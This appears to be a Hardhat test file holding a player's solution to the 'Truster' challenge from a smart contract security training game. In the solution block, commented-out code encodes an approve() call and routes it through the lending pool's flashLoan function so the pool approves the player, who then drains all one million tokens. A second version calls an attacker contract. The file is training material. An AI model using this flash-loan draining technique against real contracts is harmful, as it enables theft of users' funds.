const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, player;
    let token, pool;

    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
        expect(await pool.token()).to.eq(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

        expect(await token.balanceOf(player.address)).to.equal(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        // version 1.0.0
        // const iface = new ethers.utils.Interface([
        //     "function approve(address spender, uint256 amount) public returns (bool)"
        // ])
        // const amount = ethers.utils.parseUnits("1000000000000000000000000", 0)
        // let data = iface.encodeFunctionData("approve", [player.address, amount])
        // console.log(data)
        // await pool.flashLoan(0, pool.address, token.address, data);
        // token = token.connect(player);
        // console.log("allowance[pool][player]", (await token.allowance(pool.address, player.address)).toString())
        // await token.transferFrom(pool.address, player.address, amount)
        // console.log("balanceOf[player]", (await token.balanceOf(player.address)).toString())

        // version 2.0.0
        const Attacker = await ethers.getContractFactory('Attacker3', player);
        attacker = await Attacker.deploy();
        await attacker.attack(pool.address, token.address, player.address);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await token.balanceOf(pool.address)
        ).to.equal(0);
    });
});

